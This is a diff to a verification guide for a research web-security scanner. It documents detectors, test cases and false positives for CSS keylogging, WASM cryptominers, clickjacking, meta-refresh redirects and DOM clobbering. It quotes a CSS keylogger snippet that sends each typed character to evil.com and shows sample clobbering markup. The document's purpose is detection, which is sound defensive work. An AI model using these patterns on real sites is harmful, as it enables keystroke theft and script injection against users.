@@ -520,7 +520,9 @@ for f in s.scan('test_cases/css/tc12_font_keylog.css'):
 **Expected output:** 6 HIGH findings (one per single-char @font-face block) and 1 CRITICAL
 (bulk pattern). Lines 36–45 should NOT appear.
 
-**Reference:** maxchehab, "CSS Keylogger," *GitHub PoC*, 2018. https://github.com/maxchehab/CSS-Keylogger — Original proof-of-concept demonstrating `@font-face { unicode-range: U+0041; src: url(evil.com/?A); }` per character. No peer-reviewed paper exists for this specific attack. The attack concept is also described in Heyes, "CSS Injection Primitives" (PortSwigger, 2024, above). The scanner's detection condition — single-codepoint `unicode-range` + external `src: url(https://...)` — is the exact PoC pattern. **Source note:** practitioner blog + GitHub PoC only; no conference paper citation is possible for this attack.
+**Known false positives:** Legitimate web fonts using narrow `unicode-range` for CJK subsets may use single-codepoint declarations, though this is uncommon in practice — standard CJK subset fonts use broad ranges (e.g., `U+4E00-9FFF`). The scanner's two-condition requirement (single-codepoint range AND external URL) substantially reduces false positives; broad-range font subsets and local `src:` URLs are both correctly excluded. On real data, expect this detector to be low-volume with low FP rate. **Source disclosure:** practitioner blog + GitHub PoC only; no peer-reviewed paper citation is possible for this attack.
+
+**Reference:** maxchehab, "CSS Keylogger," *GitHub PoC*, 2018. https://github.com/maxchehab/CSS-Keylogger — Original proof-of-concept demonstrating `@font-face { unicode-range: U+0041; src: url(evil.com/?A); }` per character. No peer-reviewed paper exists for this specific attack. The attack concept is also described in Heyes, "CSS Injection Primitives" (PortSwigger, 2024, above). The scanner's detection condition — single-codepoint `unicode-range` + external `src: url(https://...)` — is the exact PoC pattern.
 
 ---
 
@@ -697,7 +699,11 @@ for the aggregate (3+ signatures). Verify `tc17_clean.wasm` produces 0 HIGH find
 
 **Known false negatives:** Obfuscated WASM miners that strip or encrypt string sections will evade byte-string detection. The `KNOWN_MINER_HASHES` set is currently empty (placeholder) -- hash-based detection requires populating it from MineSweeper/MinerRay publications. Miners using algorithms not in the signature list (e.g., newer algorithms like Autolykos, KawPoW) are not detected.
 
-**Reference:** Konoth et al., "MineSweeper: An In-depth Look into Browser-based Cryptomining," *ACM CCS 2018*. https://dl.acm.org/doi/10.1145/3243734.3243858 — §5 covers WASM-based mining; identifies that miner WASM modules retain algorithm string constants (`cryptonight`, `cn_slow_hash`, `scratchpad`, `keccak`, `stratum`) because WASM export names and embedded strings survive compilation. The scanner's byte-level string search follows this approach. **Citation caveat:** The codebase previously cited "Romano et al., IEEE S&P 2020" for this attack — that citation could **not be verified** at IEEE S&P 2020 or arXiv; the correct primary source is Konoth et al. CCS 2018. If you locate the Romano et al. paper independently, verify the venue before including it. Also relevant: Romano et al., "An Empirical Study of Obfuscated WebAssembly," *WebSci 2020* — covers obfuscated WASM (which the scanner does *not* handle; the byte-string approach only works on non-obfuscated miners).
+**Reference (primary):** Konoth et al., "MineSweeper: An In-depth Look into Browser-based Cryptomining," *ACM CCS 2018*. https://dl.acm.org/doi/10.1145/3243734.3243858 — §5 covers WASM-based mining; identifies that miner WASM modules retain algorithm string constants (`cryptonight`, `cn_slow_hash`, `scratchpad`, `keccak`, `stratum`) because WASM export names and embedded strings survive compilation. The scanner's byte-level string search directly follows this approach.
+
+**Reference (secondary / threat motivation):** Romano, Lehmann, Pradel, and Wang, "Wobfuscator: Obfuscating JavaScript Malware via Opportunistic Translation to WebAssembly," *IEEE S&P 2022*. DOI: 10.1109/SP46214.2022.00064 — demonstrates that JS malware (including miners) can be partially translated into WASM to evade JS-side static detectors, reducing recall of four state-of-the-art detectors from 0.18–0.63 to near 0.00. Directly motivates why WASM-level scanning is needed alongside JS scanning. Key finding for our scanner: the T1-StringLiteral transformation moves JS string literals into WASM linear memory as null-terminated bytes, meaning our `MINER_SIGNATURES_BYTES` byte search **would still detect** those strings in the WASM binary. However, T3-FunctionName and T4-CallExpression obfuscate function call structure, partially evading our export-name heuristic.
+
+**Citation history:** The codebase originally cited "Romano et al., IEEE S&P 2020" — the correct paper is Wobfuscator, IEEE S&P **2022** (not 2020). The earlier year was a documentation error. Konoth et al. CCS 2018 is the correct reference for the detection methodology; Wobfuscator is the correct reference for the threat model (JS-to-WASM malware obfuscation).
 
 ---
 
@@ -746,14 +752,22 @@ for f in s.scan('test_cases/html/tc_html_attacks.html'):
 ---
 
 ### Attack 19: Clickjacking
-**Gist:** An attacker loads your bank's transfer page in a transparent `<iframe>` on their
-site, overlaid over a fake button. The victim thinks they're clicking "Win a prize!" but
-actually confirms a bank transfer. Defence is `X-Frame-Options: DENY` or `Content-Security-Policy: frame-ancestors 'none'`.
+**Gist:** An attacker loads a sensitive page (bank transfer, OAuth dialog) in a transparent
+`<iframe>` overlaid on a decoy button. The victim thinks they're clicking "Win a prize!" but
+confirms the underlying action. Alternatively, an attacker embeds an invisible overlay element
+over the victim's page to intercept clicks. Defence is `X-Frame-Options: DENY` or
+`Content-Security-Policy: frame-ancestors 'none'`.
 
-**Scanner logic:** HTML: detects hidden/transparent `<iframe>` with `opacity:0` or
-`visibility:hidden` or `position:absolute/fixed` in the style. Also checks whether a page
-containing forms or a login keyword has any frame-busting defence (meta X-Frame-Options,
-CSP `frame-ancestors`, or JS `top !== self`). Absence of defence = MEDIUM.
+**Scanner logic:** Detects two classes of evidence from Huang et al. §3.1:
+
+- **HIGH** (active attack indicator): hidden/transparent `<iframe>` with inline `opacity:0`,
+  `visibility:hidden`, or `position:absolute/fixed` — the transparent overlay technique
+  (Huang §3.1.1, target display integrity compromise).
+
+- **MEDIUM** (missing defense): page contains forms or login-related keywords but has no
+  inline frame-busting defense detectable from archived HTML (no `<meta http-equiv="x-frame-options">`,
+  no CSP `frame-ancestors` in a meta tag, no JS `top !== self` check). This is a
+  **systematic false positive source** — see Known false positives.
 
 **Test file:** `test_cases/html/tc_html_attacks.html`
 - Line 28: `<iframe style="opacity:0; position:absolute...">` — HIGH (hidden overlay)
@@ -772,14 +786,53 @@ for f in s.scan('test_cases/html/tc_html_attacks.html'):
 
 **Expected output:** Line 28 as HIGH (hidden iframe). 1 MEDIUM (login page, no frame-busting).
 
-**Known false negatives / systematic FPs:** Pages that use only the `X-Frame-Options` HTTP header for defense (the recommended approach) will be reported as MEDIUM even though they are properly protected -- the header is not in the archived HTML. Expect a high MEDIUM rate on well-configured government sites. The HIGH detection requires the overlay iframe to be inline-styled; CSS-class-based hiding (e.g., `class="hidden"`) is not detected.
+**Known false positives:**
+- **Systematic MEDIUM FP — header-protected pages:** Pages that rely solely on the HTTP
+  `X-Frame-Options` header (the recommended and most common defense) are reported as MEDIUM
+  even though they are properly protected — the header is not in the archived HTML. Expect
+  a high MEDIUM rate on well-configured government sites. For the longitudinal study, use
+  `archive-sec-analysis/clickjacking_detector/` which reads HTTP headers from archived JSON.
+- **CSS-class-based hiding not detected:** The HIGH detection requires inline `style=`
+  attribute; hidden iframes using a CSS class (e.g., `class="invisible"`) are not detected.
+
+**Known false negatives:**
+- **Non-iframe invisible overlay elements:** Sanchez-Rola et al. WWW 2020 (§5.1) find that
+  invisible-layer attacks most commonly use generic overlay `<div>` or `<span>` elements with
+  `position:fixed`, `opacity:0`, or `pointer-events:none` — not iframes. Our scanner only
+  checks `<iframe>` elements. Extending to arbitrary elements would generate unacceptable FPs
+  since legitimate modals, dropdowns, and tooltips use identical CSS patterns.
+- **Cursor spoofing (pointer integrity) not detected:** Huang §3.1.2 — `cursor: none` or
+  custom cursor icon to mislead click location. Not statically detectable without rendering.
+- **Bait-and-switch (temporal integrity) not detected:** Huang §3.1.3 — JS moves a target
+  element over a decoy immediately before the click fires. Requires dynamic analysis.
 
 **Implementation choice: archive-sec-analysis (`clickjacking_detector/`)**
 - Checks `X-Frame-Options` HTTP header from the archived JSON headers — the primary defence mechanism
 - HTML-based frame-busting JS is easily bypassed; header-based check is authoritative
-- Use for longitudinal header analysis; security_pipeline covers the HTML side
+- Use for longitudinal header analysis; security_pipeline covers the HTML inline evidence side
 
-**Reference:** Huang et al., "Clickjacking: Attacks and Defenses," *USENIX Security 2012*. https://www.usenix.org/conference/usenixsecurity12/technical-sessions/presentation/huang — Defines the transparent iframe overlay attack and evaluates frame-busting defences; shows JS-based frame-busting is bypassable via `sandbox` attribute on the outer iframe, making `X-Frame-Options` / `frame-ancestors` the only reliable defence. **Important limitation:** the scanner can only detect inline HTML-level defences (meta tags, JS frame-busting code); pages relying solely on the HTTP `X-Frame-Options` header — the recommended approach — will be flagged as undefended even if they were protected. This produces systematic false positives for header-protected pages in the archive.
+**Reference (primary — attack taxonomy):** Huang, Moshchuk, Wang, Schechter, and Jackson,
+"Clickjacking: Attacks and Defenses," *USENIX Security 2012*.
+https://www.usenix.org/conference/usenixsecurity12/technical-sessions/presentation/huang —
+Defines three attack classes by what they compromise: (1) target display integrity (opacity:0,
+z-index, pointer-events:none — the class our HIGH detector targets), (2) pointer integrity
+(cursor spoofing — not detected), (3) temporal integrity (bait-and-switch — not detected).
+§3.2.1 demonstrates JS frame-busting is bypassable via `sandbox` attribute on the outer iframe,
+establishing `X-Frame-Options` / `frame-ancestors` as the only reliable defense. User study
+(n=2,064 via AMT) confirms attack success rates of 98%, 47%, and 43% for the three variants.
+
+**Reference (secondary — empirical prevalence):** Sanchez-Rola, Balzarotti, Kruegel, Vigna,
+and Santos, "Dirty Clicks: A Study of the Usability and Security Implications of Click-related
+Behaviors on the Web," *ACM The Web Conference (WWW) 2020*.
+https://dl.acm.org/doi/10.1145/3366423.3380124 — Large-scale measurement of click manipulation
+across 2.3M clicks on 117,826 pages from 10,903 websites. Key findings relevant to our scanner:
+(1) ~20% of websites contained an **Invisible Layer** (19,696 occurrences, Table 1) — an
+invisible element capturing user clicks, the core clickjacking primitive; (2) 54% of invisible-
+layer occurrences targeted a different domain (Table 1), indicating cross-origin click
+interception. Empirically establishes that the invisible-overlay attack our scanner targets is
+prevalent in the wild. **Scope note:** Dirty Clicks covers broader click manipulation (fake
+href attributes, fake local clicks) beyond iframe-based clickjacking; our scanner targets only
+the iframe overlay sub-case (HIGH) and missing frame-busting defenses (MEDIUM).
 
 ---
 
@@ -841,6 +894,8 @@ for f in s.scan('test_cases/html/tc_html_attacks.html'):
 
 **Expected output:** Line 18 as HIGH. Line 21 NOT flagged.
 
+**Known false positives:** Legitimate intentional redirects to partner portals, updated domain names, or affiliate sites will be flagged as HIGH. Wayback Machine-archived files preserve the original redirect target, so `url=https://legitimate-partner.com/` is indistinguishable from `url=https://phishing.com/` without manual review. All HIGH findings require manual triage. Pages that perform redirects via HTTP 301/302 headers (the standard approach) are not detectable from archived HTML — this scanner only catches HTML-level meta-refresh; pages relying on server-side redirects appear clean even if they redirect to external sites.
+
 **Reference:** OWASP Unvalidated Redirects and Forwards Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html — documents `<meta http-equiv="refresh">` as a client-side redirect mechanism abused for phishing and open redirect. CWE-601 (URL Redirection to Untrusted Site). No dedicated academic paper targets meta-refresh specifically; it is covered as a sub-case of open redirect in most web security textbooks.
 
 ---
@@ -873,6 +928,8 @@ for f in s.scan('test_cases/html/tc_html_attacks.html'):
 
 **Expected output:** Line 31 as HIGH. Lines 38 and 45 as MEDIUM.
 
+**Known false positives:** All `http://` form actions are flagged as HIGH regardless of form purpose — a search form over HTTP is less severe than a login form submitting credentials. All `formaction` attributes on buttons/inputs are flagged as MEDIUM regardless of whether the target is internal or external; legitimate multi-step forms using `formaction` for different internal submit endpoints will be over-flagged. Manual triage is required to distinguish credential-submitting forms (login, registration) from benign ones (search, newsletter).
+
 **Reference:** Barth et al., "Robust Defenses for Cross-Site Request Forgery," *ACM CCS 2008*. https://dl.acm.org/doi/10.1145/1455770.1455782 — §2 identifies form `action` manipulation as the primary CSRF delivery channel; the `formaction` attribute (HTML5) is an extension of this vector. The scanner's check for HTTP form actions (credential leak) and external domain actions (data exfiltration) maps to the threat model in §3.
 
 ---
@@ -902,6 +959,8 @@ for f in s.scan('test_cases/html/tc_html_attacks.html'):
 ```
 
 **Expected output:** Line 49 as CRITICAL. Line 52 as HIGH.
+
+**Known false positives:** The `javascript:` URL (CRITICAL) and `data:` URL in script/iframe (HIGH) patterns are reliable and low-FP — these are almost always intentional XSS or legacy code. The unclosed-attribute heuristic (HIGH/MEDIUM) is noisier: it looks for attribute values that end without a closing quote at the line boundary, which can false-positive on HTML files where long attributes are legitimately wrapped across lines or where template engines leave incomplete tags during rendering. On real archived HTML, expect the unclosed-attribute pattern to generate false positives; the `javascript:` and `data:` URL detections are reliable.
 
 **Reference:** Heyes, "Dangling Markup — HTML Scriptless Injection," *PortSwigger Research*, 2018. https://portswigger.net/web-security/cross-site-scripting/dangling-markup — Formalises the dangling markup injection technique (unclosed attribute values capturing subsequent page content). The `javascript:` URL and `data:` URL patterns detected by the scanner are the direct XSS sub-cases of this attack family. Also: OWASP Testing for DOM-based Open Redirect (OTG-CLIENT-004) covers `javascript:` URLs in navigation attributes.
 
@@ -937,6 +996,8 @@ for f in s.scan('test_cases/html/tc_html_violations.html'):
   to the archive study
 - archive-sec-analysis `html-violation-analyzer` uses a rule-based checker with named rules
   (DE*, DM*, etc.) but these overlap significantly with security_pipeline's ViolationParser
+
+**Known false positives:** Real-world HTML is inherently messy. MEDIUM findings will be very high-volume on archived government pages: `<a>` wrapping `<div>` for clickable card layouts (block-in-inline), ubiquitous unclosed `<li>`, `<p>`, `<td>` tags that rely on implicit close, and duplicate IDs generated by templating systems. The scanner uses HTML4-era inline/block rules — HTML5 explicitly allows interactive content (`<a>` wrapping block elements) but the scanner still flags it. For paper analysis, use only HIGH findings (nested forms) as a reliable signal; MEDIUM findings require manual sampling to estimate the FP rate.
 
 **Reference:** Weinberger et al., "A Systematic Analysis of XSS Sanitization in Web Application Frameworks," *ESORICS 2011*. https://link.springer.com/chapter/10.1007/978-3-642-23822-2_4 — §4 shows how structural HTML violations (nested forms, unclosed tags, block-in-inline nesting) cause browser parse-tree inconsistencies that enable XSS filter bypasses. Duplicate IDs as a DOM clobbering vector is covered by Gareth Heyes, "DOM clobbering strikes back," *PortSwigger Research*, 2020: https://portswigger.net/research/dom-clobbering-strikes-back
 
@@ -1021,6 +1082,104 @@ All annotated as `[INLINE SCRIPT line 55]`.
 
 ---
 
+## Attack 26: DOM Clobbering
+
+**Gist:** Named HTML elements (`name`/`id` attributes) are promoted to properties on `window`
+and `document` in all major browsers. If a page (or a CMS/editor that accepts HTML input)
+contains `<form name="config">`, any JS code that reads `window.config` receives an
+HTMLFormElement instead of the expected application object. Because DOM elements are truthy,
+security checks like `if (window.isAdmin)` or `if (config.token)` silently pass even when
+the real values are false/null. Liu et al. USENIX Security 2025 (DOMino) found 497
+exploitable gadgets in the Tranco Top 5,000, including zero-days in Google API client
+library, Webpack, Canvas LMS, and Jupyter Notebook — 19 CVE identifiers assigned.
+
+**References:**
+- Liu et al., "The DOMino Effect: Detecting and Exploiting DOM Clobbering Gadgets via
+  Concolic Execution with Symbolic DOM," USENIX Security 2025. *(primary — Hulk tool,
+  large-scale measurement, 19 CVEs)*
+- Lekies, Jonker & Johns, "DOM Clobbering Strikes Back," USENIX Security 2021.
+  *(gadget taxonomy, two-level clobbering, namespace promotion rules)*
+- Khodayari & Pellegrino, "It's (DOM) Clobbering Time: Attack Techniques, Prevalence,
+  and Defenses," IEEE S&P 2023. *(first large-scale prevalence study; 9.8% of pages;
+  CSP nonce bypass)*
+
+**Scanner logic:**
+
+*HTML_SINK* (`html_scanner.py: _test_dom_clobbering`):
+- Regex over `form|input|img|a|object|embed|iframe` elements for `name=` or `id=` attributes
+  matching the sensitive names set (browser globals + security app globals + boolean flags)
+- `<iframe name="scripts|forms|images|links|anchors">` → CRITICAL (Liu et al. 2025
+  motivating example: `document.scripts` shadowed → XSS in Google API client)
+- All other sensitive-name/id matches → HIGH
+
+*CHAIN* (`html_scanner.py: _test_dom_clobbering`):
+- When an HTML_SINK element name is also accessed in an inline `<script>` block
+  in the same document → CRITICAL (no injection required; collision already present)
+
+*Two-level* (`html_scanner.py: _test_dom_clobbering`):
+- `<form id="x">...<input name="y">` pattern → HIGH
+  Enables `x.y` property forgery in JS (Lekies et al. 2021 §3)
+
+*JS_RELIANCE* (`js_scanner.py: _test_dom_clobbering`):
+- `window[variable]` dynamic access → HIGH
+- `document.scripts/forms/images/links/anchors` access → HIGH
+- Security global in conditional (`if (isAdmin)`, `if (window.csrf)`) → HIGH
+- `window.nonce` / `document.nonce` CSP nonce read → HIGH
+- `window.config/settings/app` direct access → MEDIUM
+- `document.auth/config/nonce` named access → MEDIUM
+- Bare security variable (`isLoggedIn &&`) without visible declaration → LOW
+
+**Test file:** `test_cases/html/tc_dom_clobbering.html`, `test_cases/js/tc_dom_clobbering.js`
+
+Key positive cases:
+- `tc_dom_clobbering.html` line 9: `<iframe name="scripts">` → CRITICAL (HTML_SINK)
+- `tc_dom_clobbering.html` line 13: `<form name="config">` → HIGH (HTML_SINK)
+- `tc_dom_clobbering.html` script block: `window.config &&` → CHAIN CRITICAL
+- `tc_dom_clobbering.html` lines 40–43: `<form id="userState"><input name="isAdmin">` → HIGH (two-level)
+- `tc_dom_clobbering.js` line 8: `var plugin = window[key]` → HIGH
+- `tc_dom_clobbering.js` line 12: `document.scripts || ...` → HIGH
+
+**Command:**
+```bash
+python -c "
+from scanners.html_scanner import HTMLScanner
+from scanners.js_scanner import JavaScriptScanner
+hs = HTMLScanner()
+js = JavaScriptScanner()
+for f in hs.scan('test_cases/html/tc_dom_clobbering.html'):
+    if f.test_name == 'dom_clobbering':
+        print(f'  [{f.severity}] line {f.line_number}: {f.description[:80]}')
+for f in js.scan('test_cases/js/tc_dom_clobbering.js'):
+    if f.test_name == 'dom_clobbering':
+        print(f'  JS [{f.severity}] line {f.line_number}: {f.description[:80]}')
+"
+```
+
+**Expected output:** CRITICAL for `<iframe name="scripts">` and CHAIN finding; HIGH for
+`<form name="config">`, `<input name="auth">`, `<a name="location">`, two-level form,
+`window[key]`, `document.scripts`, security-guard conditional; MEDIUM for `window.config`,
+`document.auth`.
+
+**Known false positives:**
+- `<iframe name="scripts">` is CRITICAL only when the name matches a document collection
+  property. Legitimate iframes may use these names for embedding partner content. In
+  government archive context, finding rate is expected to be low.
+- Two-level (`<form id><input name>`) flags all such structures regardless of whether
+  any JS code exploits the `form.input` path. Manual triage needed.
+- `window[variable]` (HIGH) fires on legitimate plugin loader patterns. The variable must
+  be attacker-controllable for actual exploitability.
+- `document.scripts` access (HIGH) may false-positive on pages that defensively check
+  loaded scripts (e.g., SRI verification logic).
+
+**Known false negatives:**
+- Gadgets spanning multiple JS files (e.g., clobbered name in HTML, access in external
+  `.js` file) are not detected as CHAIN — only inline scripts in the same HTML page.
+- Dynamic property lookups using string concatenation (`document['scr' + 'ipts']`) missed.
+- Complex gadget chains requiring dynamic analysis (e.g., Liu et al. 2025 §3.2 taint
+  propagation through array operations) are not detectable statically.
+
+---
+
 ## Running All Verifications
 
 ```bash
@@ -1042,7 +1201,7 @@ These should be disclosed in the paper's methodology section.
 | 1 | Prototype Pollution | `constructor.prototype` and `__proto__` assignment patterns now detected (HIGH). Remaining gaps: `Object.defineProperty(Object.prototype,...)`, `Object.setPrototypeOf()`, and hasOwnProperty-guarded for-in loops (flagged as HIGH but are safe — disclose as known FP class) | Disclose in paper |
 | 2 | ReDoS | Syntactic heuristic detection of Star Height > 1 and QOD anti-patterns (Davis et al. ESEC/FSE 2018 §5.1). QOA — the most common SL anti-pattern (71% of npm SL regexes) — is not detected; requires AST-level character-set overlap analysis. All three anti-patterns have 90–98% FP rates statically (Table 4). Framing confirmed: describe as syntactic heuristic in paper methodology. | Disclose in paper |
 | 3 | Dangerous Sinks | `setTimeout(varName, delay)` FP fixed: string literal args are CRITICAL, variable args are MEDIUM (callback-or-string ambiguity disclosed as known limitation). `setAttribute('on*', var)` added as HIGH per Lekies et al. CCS 2013 §2. Verified and approved. | Disclose in paper |
-| 4 | WASM Cryptominer | "Romano et al., IEEE S&P 2020" citation unverified — cannot locate this paper at IEEE S&P 2020. Use Konoth et al. CCS 2018 as primary reference instead | Fix citation before paper |
+| 4 | WASM Cryptominer | Citation resolved: Romano et al. IEEE S&P 2022 (Wobfuscator) verified — year in original notes was wrong (2020→2022). Paper is about JS-to-WASM malware obfuscation, not cryptominer detection specifically. Konoth et al. CCS 2018 is primary reference for detection approach; Wobfuscator added as secondary reference for threat motivation. Both now documented in VERIFICATION_GUIDE. | Disclose in paper |
 | 5 | Clickjacking | Pages using only HTTP `X-Frame-Options` headers (recommended approach) are flagged as unprotected. Creates systematic false positives for header-protected pages in the archive. Must be disclosed | Disclose in paper |
 | 6 | CSS Attacks (10–12) | No peer-reviewed paper citation available; sources are PortSwigger research blog and GitHub PoC. Attacks are technically correct and widely accepted in practitioner literature | Disclose in paper |
 | 7 | Vulnerable Library | React CVE-2015-1164 entry is questionable — `dangerouslySetInnerHTML` is an intentional API opt-in, not a CVE. Consider removing this entry | Verify before paper |
